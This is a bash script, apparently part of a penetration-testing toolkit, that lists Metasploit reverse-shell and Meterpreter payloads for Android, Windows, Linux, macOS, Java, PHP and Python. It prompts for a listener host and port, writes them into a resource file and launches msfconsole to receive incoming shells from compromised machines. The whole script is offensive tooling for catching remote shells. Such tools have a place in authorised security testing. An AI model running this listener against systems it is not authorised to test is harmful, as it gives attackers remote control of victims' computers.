#!/usr/bin/bash

clear
f_banner

echo -e "${BLUE}Metasploit Listeners${NC}"
echo
echo "1.   android/meterpreter/reverse_tcp"
echo "2.   cmd/windows/reverse_powershell"
echo "3.   java/jsp_shell_reverse_tcp"
echo "4.   linux/x64/meterpreter_reverse_https"
echo "5.   linux/x64/meterpreter_reverse_tcp"
echo "6.   linux/x64/shell/reverse_tcp"
echo "7.   osx/x64/meterpreter_reverse_https"
echo "8.   osx/x64/meterpreter_reverse_tcp"
echo "9.   php/meterpreter/reverse_tcp"
echo "10.  python/meterpreter_reverse_https"
echo "11.  python/meterpreter_reverse_tcp"
echo "12.  windows/x64/meterpreter_reverse_https"
echo "13.  windows/x64/meterpreter_reverse_tcp"
echo "14.  Previous menu"
echo
echo -n "Choice: "
read choice

case $choice in
     1) payload="android/meterpreter/reverse_tcp";;
     2) payload="cmd/windows/reverse_powershell";;
     3) payload="java/jsp_shell_reverse_tcp";;
     4) payload="linux/x64/meterpreter_reverse_https";;
     5) payload="linux/x64/meterpreter_reverse_tcp";;
     6) payload="linux/x64/shell/reverse_tcp";;
     7) payload="osx/x64/meterpreter_reverse_https";;
     8) payload="osx/x64/meterpreter_reverse_tcp";;
     9) payload="php/meterpreter/reverse_tcp";;
     10) payload="python/meterpreter_reverse_https";;
     11) payload="python/meterpreter_reverse_tcp";;
     12) payload="windows/x64/meterpreter_reverse_https";;
     13) payload="windows/x64/meterpreter_reverse_tcp";;
     14) f_main;;
     *) f_error;;
esac

echo
echo -n "LHOST: "
read lhost

# Check for no answer
if [ -z $lhost ]; then
     lhost=$ip
     echo "[*] Using $ip"
     echo
fi

echo -n "LPORT: "
read lport

# Check for no answer
if [ -z $lport ]; then
     lport=443
     echo "[*] Using 443"
fi

# Check for valid port number.
if [[ $lport -lt 1 || $lport -gt 65535 ]]; then
     f_error
fi

# Check for root when binding to a low port
if [[ $lport -lt 1025 && "$(id -u)" != "0" ]]; then
     echo "You must be root to bind to a port that low."
     sleep 3
     f_error
fi

cp $discover/resource/listener.rc /tmp/

sed -i "s|aaa|$payload|g" /tmp/listener.rc
sed -i "s/bbb/$lhost/g" /tmp/listener.rc
sed -i "s/ccc/$lport/g" /tmp/listener.rc

echo
msfconsole -q -r /tmp/listener.rc
